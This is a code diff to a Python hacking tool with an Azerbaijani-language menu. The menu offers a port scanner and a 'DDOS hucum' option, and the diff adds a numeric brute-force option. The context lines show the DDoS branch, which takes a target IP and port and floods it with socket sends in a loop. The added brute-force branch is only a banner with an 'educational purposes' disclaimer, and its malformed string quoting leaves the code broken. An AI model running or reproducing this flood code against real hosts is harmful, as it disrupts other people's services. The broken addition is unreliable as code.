@@ -79,7 +79,8 @@ print_colored("| BY RED_BITH  |", Colors.GREEN)
 
 print_colored("""1.Hedef site haqqinda
 2.port scanner
-3.DDOS hucum    
+3.DDOS hucum
+4.Brute-Force(reqem)
   """, Colors.YELLOW)
 secim = input("Nov sec:")
 
@@ -97,6 +98,7 @@ elif(secim == '3'):
     #  HUCUMA HAZIRDIR        #
     ###########################
     """, Colors.RED)
+    
     hedef_ip=input("Hedef ip daxil et :")
     hedef_port=int(input("Hedef port:"))
 
@@ -107,6 +109,18 @@ elif(secim == '3'):
         sock.sendto(bytes , (hedef_ip,hedef_port))
         sayac=sayac+1
         print_colored("HUCUM EDILIR , gonderilen byte:%s"%(sayac) , Colors.GREEN)
+
+elif(secim == '4'):
+    main = colored("""
+###############################
+#  ATTACK- BRUTE FORCE!       #
+#   BY RED-BITH               #
+# ASAGIDAKI QAYDALARA EMEL ET #
+###############################
+  """, Colors.BLUE) + colored(("""1. Bu sade brute-force  toolu sadece reqemli sifre qira biler!
+2.Bu sadece egitim meqsedlidir, Brute-force mentiqni qavramaginiz ucundur.""", Colors.YELLOW)"""
+3. !!! Qeyri-etik olaraq YOXLAMAQ TOVSIYYE EDILMIR, sorumluluq QEBUL EDİLMİR !!!""", Colors.RED)
+
 
 else:
     print_colored("----Xəta baş verdi!", Colors.RED)
